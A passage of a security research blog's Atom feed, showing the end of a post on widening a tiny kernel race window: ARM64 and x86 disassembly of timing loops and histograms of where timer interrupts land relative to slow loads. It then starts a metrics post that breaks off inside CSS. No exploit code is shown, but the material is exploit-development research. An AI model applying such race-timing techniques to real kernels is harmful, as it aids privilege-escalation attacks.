&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006b4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006b8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006bc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006c0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006c4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006c8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006cc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006d0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006d4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;f9400061 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ldr&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, [x3]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006d8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006dc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c7"&gt;&amp;nbsp; 4006e0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006e4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;17ffffef &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;b&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;4006a0 &amp;lt;main+0x100&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;the cache-missing loads obviously have a large influence on the timing. On the in-order core:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEie4WFUqhiL_H1pxbU_2lUfAaYJQLubtcW_KqPEDemtMCFxpId8H4xs9sFnhui_sqf2oCr9yARQxAGB9-ej4GD3CQdmypHDK9QD5WAL2AS64Iz-WCUgKlKFtVyjJ9swQhnZOF9NCZJw_JdmBg-BlxAtqTay9eAWSfhHjr6n_Sgg6VhpoZzh8QD-xHeOfg/s1252/image4.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEie4WFUqhiL_H1pxbU_2lUfAaYJQLubtcW_KqPEDemtMCFxpId8H4xs9sFnhui_sqf2oCr9yARQxAGB9-ej4GD3CQdmypHDK9QD5WAL2AS64Iz-WCUgKlKFtVyjJ9swQhnZOF9NCZJw_JdmBg-BlxAtqTay9eAWSfhHjr6n_Sgg6VhpoZzh8QD-xHeOfg/s600/image4.png" border="0" alt="A histogram of interrupt instruction pointers, showing that most interrupts are delivered with PC pointing to the instruction after the high-latency load instruction." style="max-height: 750; max-width: 600;"title="A histogram of interrupt instruction pointers, showing that most interrupts are delivered with PC pointing to the instruction after the high-latency load instruction." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;On the OOO core:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTuK6gNw72sreYVEF_lHfOxHPGElJG1G4_alcQQFzLup5yDnJItZ1E39nK3y7haSH3QhsTiAYmJhcyNltONZPuq-tM5Id1xL5gr6CI91n6XMZ3_ivjuahaMAhO1OiUjR4oBzChtJDh5jnlSJsW0hPQgS-H5KV-k5Gwhd68j_wwhaGGoJCxIb2SFPvhqg/s1297/image20.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTuK6gNw72sreYVEF_lHfOxHPGElJG1G4_alcQQFzLup5yDnJItZ1E39nK3y7haSH3QhsTiAYmJhcyNltONZPuq-tM5Id1xL5gr6CI91n6XMZ3_ivjuahaMAhO1OiUjR4oBzChtJDh5jnlSJsW0hPQgS-H5KV-k5Gwhd68j_wwhaGGoJCxIb2SFPvhqg/s600/image20.png" border="0" alt="A similar histogram as the previous one, except that an even larger fraction of interrupt PCs are after the high-latency load instruction." style="max-height: 750; max-width: 600;"title="A similar histogram as the previous one, except that an even larger fraction of interrupt PCs are after the high-latency load instruction." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;What is interesting to me here is that the timer interrupts seem to again arrive &lt;/span&gt;&lt;span class="c6"&gt;after&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;the slow load - implying that if an interrupt arrives while a slow memory access is in progress, the interrupt handler may not get to execute until the memory access has finished? (Unless maybe on the OOO core the interrupt handler can start speculating already? I wouldn&amp;#39;t really expect that, but could imagine it.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;On an X86 Skylake CPU, we can do a similar test:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11b8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11bc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11c0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11c3:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11c7:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11cb:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11ce:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 03 02 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;(%rdx),%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11d1:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11d5:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11d9:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11dc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11e0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11e4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; 11e7:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;eb cf &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;jmp &amp;nbsp; &amp;nbsp;11b8 &amp;lt;main+0xf8&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;with a similar result:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjxHiYxvnOgAAPSyH0eTO017J4AvucPKtF8lOphykESTarVjDoU5kS6pJcRMwpuVtDDCSQejL4VSNlhZrc2vlhcZb16dX93zY7xE3isNqAew29ZwIe0YTqjttivvuPPWymt8kSATx3C9Ehd797EdM5pjo23gyxyNRwkllWjwo-IFFaX5Rng9Sb1KiyIA/s540/image14.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjxHiYxvnOgAAPSyH0eTO017J4AvucPKtF8lOphykESTarVjDoU5kS6pJcRMwpuVtDDCSQejL4VSNlhZrc2vlhcZb16dX93zY7xE3isNqAew29ZwIe0YTqjttivvuPPWymt8kSATx3C9Ehd797EdM5pjo23gyxyNRwkllWjwo-IFFaX5Rng9Sb1KiyIA/s540/image14.png" border="0" alt="A histogram of interrupt instruction pointers, showing that almost all interrupts were delivered with RIP pointing to the instruction after the high-latency load." style="max-height: 750; max-width: 600;"title="A histogram of interrupt instruction pointers, showing that almost all interrupts were delivered with RIP pointing to the instruction after the high-latency load." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;This means that &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span&gt;&amp;nbsp;the first access to the file terminated our race window (which is not the case), we probably wouldn&amp;#39;t be able to win the race by making the access to the file slow - instead we&amp;#39;d have to slow down one of the operations before that. (But note that I have only tested simple loads, not stores or read-modify-write operations here.)&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/2892029424446991022/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2892029424446991022" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2892029424446991022" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html" title="Racing against the clock -- hitting a tiny kernel race window" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiUbfoAfxrHV-Pi1NNsfr3MrKbRDIuiWObxlGl2OaM5pty9rc1DB96iJpDBwZDCeTda9QLXGYV-NImje4yj5MNf64YcJHCV7h6QPXfqcvBXBT3cnZje6P8hVSrWDDHQIZJlozNTa4wm8cGdBlRo0EB2CaRvQymdhA26bkyBbNP2Ja7RRdoLZCD6XaKyw/s72-c/image19.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-3889819885234441482</id>
    <published>2022-02-10T08:58:00.000-08:00</published>
    <updated>2022-02-10T08:58:47.981-08:00</updated>
    <title type="text">A walk through Project Zero metrics</title>
    <content type="html">&lt;style type="text/css"&gt;ol.lst-kix_p008n8rtcs1c-3.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-3 0}.lst-kix_sr4t049r1bof-6&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-6}.lst-kix_ygk8qly5wagc-7&gt;li:before{content:"\0025cb  "}.lst-kix_p008n8rtcs1c-6&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-6}.lst-kix_ygk8qly5wagc-6&gt;li:before{content:"\0025cf  "}.lst-kix_p008n8rtcs1c-7&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-7}ol.lst-kix_p008n8rtcs1c-0.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-0 0}.lst-kix_ygk8qly5wagc-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_sr4t049r1bof-1.start{counter-reset:lst-ctn-kix_sr4t049r1bof-1 0}.lst-kix_sr4t049r1bof-5&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-5}.lst-kix_7tz9dwqwiu1-5&gt;li:before{content:"\0025a0  "}.lst-kix_7tz9dwqwiu1-4&gt;li:before{content:"\0025cb  "}.lst-kix_7tz9dwqwiu1-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_ygk8qly5wagc-6{list-style-type:none}.lst-kix_sr4t049r1bof-7&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-7}ul.lst-kix_ygk8qly5wagc-5{list-style-type:none}.lst-kix_7tz9dwqwiu1-1&gt;li:before{content:"\0025cb  "}.lst-kix_7tz9dwqwiu1-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_ygk8qly5wagc-8{list-style-type:none}ul.lst-kix_ygk8qly5wagc-7{list-style-type:none}ol.lst-kix_p008n8rtcs1c-6.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-6 0}ul.lst-kix_ygk8qly5wagc-2{list-style-type:none}ul.lst-kix_ygk8qly5wagc-1{list-style-type:none}ol.lst-kix_sr4t049r1bof-4.start{counter-reset:lst-ctn-kix_sr4t049r1bof-4 0}ul.lst-kix_ygk8qly5wagc-4{list-style-type:none}ul.lst-kix_ygk8qly5wagc-3{list-style-type:none}ul.lst-kix_ygk8qly5wagc-0{list-style-type:none}.lst-kix_p008n8rtcs1c-8&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-8}.lst-kix_7tz9dwqwiu1-0&gt;li:before{content:"\0025cf  "}.lst-kix_p008n8rtcs1c-5&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-5}.lst-kix_sr4t049r1bof-0&gt;li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-0,decimal) ") "}.lst-kix_rpco0oapapnv-8&gt;li:before{content:"\0025a0  "}.lst-kix_rpco0oapapnv-7&gt;li:before{content:"\0025cb  "}.lst-kix_sr4t049r1bof-3&gt;li:before{content:"(" counter(lst-ctn-kix_sr4t049r1bof-3,decimal) ") "}.lst-kix_sr4t049r1bof-2&gt;li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-2,lower-roman) ") "}.lst-kix_sr4t049r1bof-1&gt;li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-1,lower-latin) ") "}ol.lst-kix_sr4t049r1bof-7.start{counter-reset:lst-ctn-kix_sr4t049r1bof-7 0}.lst-kix_7tz9dwqwiu1-6&gt;li:before{content:"\0025cf  "}.lst-kix_p008n8rtcs1c-3&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-3}.lst-kix_7tz9dwqwiu1-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_sr4t049r1bof-0.start{counter-reset:lst-ctn-kix_sr4t049r1bof-0 0}.lst-kix_7tz9dwqwiu1-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_p008n8rtcs1c-5.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-5 0}ol.lst-kix_sr4t049r1bof-2{list-style-type:none}ol.lst-kix_sr4t049r1bof-1{list-style-type:none}ol.lst-kix_sr4t049r1bof-0{list-style-type:none}ol.lst-kix_sr4t049r1bof-6.start{counter-reset:lst-ctn-kix_sr4t049r1bof-6 0}ol.lst-kix_p008n8rtcs1c-4.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-4 0}.lst-kix_sr4t049r1bof-7&gt;li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-7,lower-latin) ". "}.lst-kix_sr4t049r1bof-6&gt;li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-6,decimal) ". "}.lst-kix_sr4t049r1bof-8&gt;li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-8,lower-roman) ". "}.lst-kix_sr4t049r1bof-0&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-0}.lst-kix_sr4t049r1bof-3&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-3}.lst-kix_sr4t049r1bof-4&gt;li:before{content:"(" counter(lst-ctn-kix_sr4t049r1bof-4,lower-latin) ") "}.lst-kix_sr4t049r1bof-5&gt;li:before{content:"(" counter(lst-ctn-kix_sr4t049r1bof-5,lower-roman) ") "}.lst-kix_p008n8rtcs1c-8&gt;li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-8,lower-roman) ". "}ol.lst-kix_sr4t049r1bof-2.start{counter-reset:lst-ctn-kix_sr4t049r1bof-2 0}.lst-kix_p008n8rtcs1c-7&gt;li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-7,lower-latin) ". "}.lst-kix_p008n8rtcs1c-4&gt;li:before{content:"(" counter(lst-ctn-kix_p008n8rtcs1c-4,lower-latin) ") 